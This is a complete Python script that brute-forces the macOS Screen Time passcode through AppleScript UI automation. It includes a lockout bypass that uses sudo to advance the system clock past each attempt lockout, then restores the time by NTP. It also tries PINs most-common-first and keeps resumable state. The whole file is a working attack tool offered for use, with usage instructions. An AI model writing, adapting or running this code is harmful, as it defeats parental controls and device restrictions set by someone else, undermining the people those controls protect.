#!/usr/bin/env python3
"""
Screen Time Passcode Brute-Force via UI Automation + Clock Manipulation

Tries PINs in order of most-common-first (from SecLists frequency data),
tracks progress in a state file so you can resume after interruption.

Requirements:
- Accessibility permissions for Terminal
- sudo access (for clock manipulation)
- pin_frequency.csv in the same directory

Usage:
    sudo -v && python3 bruteforce.py
    python3 bruteforce.py --reset   # clear state and start fresh
"""

import subprocess
import time
import sys
import os
import signal
import re
import json
import threading
import atexit

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PIN_CSV = os.path.join(SCRIPT_DIR, "pin_frequency.csv")
STATE_FILE = os.path.join(SCRIPT_DIR, ".bruteforce_state.json")

# ── UI element paths ──

SCROLL_AREA = (
    "scroll area 1 of group 1 of group 3 of "
    "splitter group 1 of group 1 of window 1"
)
LOCK_BUTTON = f"button 1 of group 6 of {SCROLL_AREA}"
SHEET = "sheet 1 of window 1"
PIN_FIELD = f"text field 1 of group 1 of group 1 of {SHEET}"

# ── Animation settings ──

ANIMATION_SETTINGS = [
    ("NSGlobalDomain", "NSAutomaticWindowAnimationsEnabled", "-bool", "false"),
    ("NSGlobalDomain", "NSWindowResizeTime", "-float", "0.001"),
    ("com.apple.systempreferences", "NSAutomaticWindowAnimationsEnabled", "-bool", "false"),
    ("com.apple.Accessibility", "ReduceMotionEnabled", "-int", "1"),
]
_saved_settings: dict = {}


def save_and_set_fast_animations():
    global _saved_settings
    for domain, key, *_ in ANIMATION_SETTINGS:
        r = subprocess.run(["defaults", "read", domain, key],
                           capture_output=True, text=True)
        _saved_settings[(domain, key)] = r.stdout.strip() if r.returncode == 0 else None
    for domain, key, typ, val in ANIMATION_SETTINGS:
        subprocess.run(["defaults", "write", domain, key, typ, val], capture_output=True)


def restore_animations():
    for (domain, key), old_val in _saved_settings.items():
        if old_val is None:
            subprocess.run(["defaults", "delete", domain, key], capture_output=True)
        else:
            subprocess.run(["defaults", "write", domain, key, old_val], capture_output=True)


def cleanup():
    subprocess.run(["sudo", "-n", "sntp", "-sS", "time.apple.com"],
                    capture_output=True, timeout=15)
    restore_animations()

atexit.register(cleanup)


# ── State management ──

def load_state() -> dict:
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE) as f:
            return json.load(f)
    return {"tried": []}


def save_state(state: dict):
    with open(STATE_FILE, "w") as f:
        json.dump(state, f)


def load_pin_order() -> list[str]:
    pins = []
    with open(PIN_CSV) as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            pin = line.split(",")[0].strip()
            if len(pin) == 4 and pin.isdigit():
                pins.append(pin)
    return pins


# ── AppleScript helpers ──

def osa(script: str) -> str:
    r = subprocess.run(["osascript"], input=script,
                       capture_output=True, text=True, timeout=15)
    return r.stdout.strip()


def try_pin(pin: str) -> str:
    """
    Enter PIN, wait for auto-submit, check result.
    Returns: "success" | "failure" | "lockout:N" (N = minutes remaining)
    """
    try:
        result = osa(f'''
tell application "System Events"
    tell process "System Settings"
        set frontmost to true
        tell {PIN_FIELD}
            set focused to true
        end tell
        keystroke "{pin}"
        delay 0.5

        -- Check if sheet dismissed (correct PIN)
        if (count of sheets of window 1) = 0 then
            return "success"
        end if

        -- Read status texts
        tell {SHEET}
            tell group 1
                set sts to every static text
                set r to ""
                repeat with i from 1 to count of sts
                    set r to r & (value of item i of sts) & "|"
                end repeat
                return r
            end tell
        end tell
    end tell
end tell
''')
        if result == "success":
            return "success"
        if "try again" in result.lower():
            m = re.search(r'(\d+)\s*minute', result.lower())
            mins = m.group(1) if m else "60"
            return f"lockout:{mins}"
        return "failure"
    except Exception:
        return "lockout:60"


def open_dialog() -> bool:
    """Open the PIN entry sheet. Returns True if sheet appeared."""
    try:
        result = osa(f'''
tell application "System Events"
    tell process "System Settings"
        set frontmost to true
        click {LOCK_BUTTON}
        delay 0.3
        return (count of sheets of window 1) as text
    end tell
end tell
''')
        return result == "1"
    except Exception:
        return False


def dismiss_and_reopen() -> bool:
    """Dismiss lockout sheet and reopen fresh one in a single call."""
    try:
        result = osa(f'''
tell application "System Events"
    tell process "System Settings"
        -- Dismiss
        tell {SHEET}
            tell group 1
                click button 1
            end tell
        end tell
        delay 0.15
        -- Reopen
        set frontmost to true
        click {LOCK_BUTTON}
        delay 0.3
        return (count of sheets of window 1) as text
    end tell
end tell
''')
        return result == "1"
    except Exception:
        return False


def check_sheet_status() -> str:
    """Check current sheet state. Returns 'open' | 'lockout:N' | 'none'."""
    try:
        result = osa(f'''
tell application "System Events"
    tell process "System Settings"
        if (count of sheets of window 1) = 0 then return "none"
        tell {SHEET}
            tell group 1
                set sts to every static text
                set r to ""
                repeat with i from 1 to count of sts
                    set r to r & (value of item i of sts) & "|"
                end repeat
                return r
            end tell
        end tell
    end tell
end tell
''')
        if result == "none":
            return "none"
        if "try again" in result.lower():
            m = re.search(r'(\d+)\s*minute', result.lower())
            mins = m.group(1) if m else "60"
            return f"lockout:{mins}"
        return "open"
    except Exception:
        return "none"


def advance_clock(mins: int) -> bool:
    """Advance system clock by N minutes. Returns success."""
    ensure_sudo()
    future = subprocess.run(
        ["date", "-v", f"+{mins}M", "+%m%d%H%M%Y"],
        capture_output=True, text=True
    ).stdout.strip()
    r = subprocess.run(["sudo", "-n", "date", future],
                       capture_output=True, text=True, timeout=5)
    if r.returncode != 0:
        ensure_sudo()
        r = subprocess.run(["sudo", "-n", "date", future],
                           capture_output=True, text=True, timeout=5)
    return r.returncode == 0


def ensure_sudo():
    """Make sure sudo credentials are cached. Prompts if needed."""
    r = subprocess.run(["sudo", "-n", "true"], capture_output=True)
    if r.returncode != 0:
        print("\n  [!] sudo expired, re-authenticating...")
        subprocess.run(["sudo", "-v"])


def reset_clock():
    """Reset clock to real time via NTP. Retries with sudo refresh if needed."""
    ensure_sudo()
    r = subprocess.run(["sudo", "-n", "sntp", "-sS", "time.apple.com"],
                        capture_output=True, text=True, timeout=15)
    if r.returncode != 0:
        ensure_sudo()
        subprocess.run(["sudo", "-n", "sntp", "-sS", "time.apple.com"],
                        capture_output=True, timeout=15)


def bypass_lockout(lockout_mins: int) -> bool:
    """Full lockout bypass: advance clock, reset NTP, dismiss+reopen."""
    advance = int(lockout_mins * 1.2) + 1
    print(f"\n  [*] Bypassing {lockout_mins}min lockout (advancing {advance}min)...")

    if not advance_clock(advance):
        print("  [!] Clock advance failed")
        return False

    if not dismiss_and_reopen():
        print("  [!] Could not reopen dialog after bypass")
        return False

    reset_clock()

    print("  [+] Bypassed!")
    return True


def ensure_settings_open():
    subprocess.run(
        ["open", "x-apple.systempreferences:com.apple.Screen-Time-Settings.extension"],
        capture_output=True
    )
    time.sleep(0.8)


def main():
    import argparse
    parser = argparse.ArgumentParser(description="Screen Time PIN brute-force")
    parser.add_argument("--reset", action="store_true", help="Clear state and start fresh")
    args = parser.parse_args()

    if args.reset:
        if os.path.exists(STATE_FILE):
            os.remove(STATE_FILE)
        print("[*] State cleared.")

    if not os.path.exists(PIN_CSV):
        print(f"[!] Missing {PIN_CSV}")
        sys.exit(1)

    all_pins = load_pin_order()
    state = load_state()
    tried = set(state["tried"])
    remaining_pins = [p for p in all_pins if p not in tried]
    total = len(all_pins)

    print("=== Screen Time Passcode Brute-Force ===")
    print(f"PINs: {total} total, {len(tried)} tried, {len(remaining_pins)} remaining")
    print()

    # Animations
    print("[*] Disabling animations (will restore on exit)...")
    save_and_set_fast_animations()

    # Sudo
    print("[*] Checking sudo...")
    r = subprocess.run(["sudo", "-n", "true"], capture_output=True)
    if r.returncode != 0:
        subprocess.run(["sudo", "-v"])
    def sudo_keepalive():
        while True:
            time.sleep(30)
            subprocess.run(["sudo", "-n", "-v"], capture_output=True)
    threading.Thread(target=sudo_keepalive, daemon=True).start()

    # Reset clock in case previous run left it advanced
    reset_clock()

    # Open settings
    ensure_settings_open()

    # Signals
    current_pin = ""
    pins_done = 0

    def on_exit(sig, frame):
        save_state(state)
        print(f"\n\n[!] Interrupted at PIN {current_pin}")
        print(f"[*] {len(tried)}/{total} tried. Run again to resume.")
        sys.exit(1)
    signal.signal(signal.SIGINT, on_exit)
    signal.signal(signal.SIGTERM, on_exit)

    # Open dialog
    if not open_dialog():
        if check_sheet_status() == "none":
            print("[!] Could not open PIN dialog")
            sys.exit(1)

    print(f"[*] Brute-forcing ({len(remaining_pins)} PINs, most common first)...\n")
    start_time = time.time()

    for pin in remaining_pins:
        current_pin = pin

        # Ensure settings and dialog are open
        status = check_sheet_status()
        if status == "none":
            ensure_settings_open()
            if not open_dialog():
                print(f"\n[!] Cannot open dialog at PIN {pin}")
                save_state(state)
                sys.exit(1)
            status = check_sheet_status()

        # Bypass lockout if needed
        if status.startswith("lockout:"):
            lockout_mins = int(status.split(":")[1])
            if not bypass_lockout(lockout_mins):
                print(f"\n[!] Bypass failed at PIN {pin}")
                save_state(state)
                sys.exit(1)

        # Progress
        elapsed = time.time() - start_time
        if pins_done > 0:
            per_pin = elapsed / pins_done
            eta_secs = (len(remaining_pins) - pins_done) * per_pin
            m, s = divmod(int(eta_secs), 60)
            h, m = divmod(m, 60)
            eta = f"{h}h{m:02d}m" if h else f"{m}m{s:02d}s"
            sys.stdout.write(f"\r[*] {pin}  ({len(tried)}/{total}, {per_pin:.1f}s/pin, ETA {eta})   ")
        else:
            sys.stdout.write(f"\r[*] {pin}  ({len(tried)}/{total})")
        sys.stdout.flush()

        # Enter PIN
        result = try_pin(pin)

        if result == "success":
            tried.add(pin)
            state["tried"] = list(tried)
            save_state(state)
            elapsed = time.time() - start_time
            print(f"\n\n{'='*50}")
            print(f"  PIN FOUND: {pin}")
            print(f"  Attempts:  {len(tried)}")
            print(f"  Time:      {elapsed:.1f}s")
            print(f"{'='*50}")
            return

        elif result.startswith("lockout:"):
            # PIN was tried (attempt count went up) and triggered a new lockout.
            # Next iteration will bypass it at the top.
            pass

        tried.add(pin)
        pins_done += 1
        state["tried"] = list(tried)
        if pins_done % 10 == 0:
            save_state(state)

    save_state(state)
    elapsed = time.time() - start_time
    print(f"\n\n[*] Exhausted all {total} PINs in {elapsed:.1f}s")


if __name__ == "__main__":
    main()
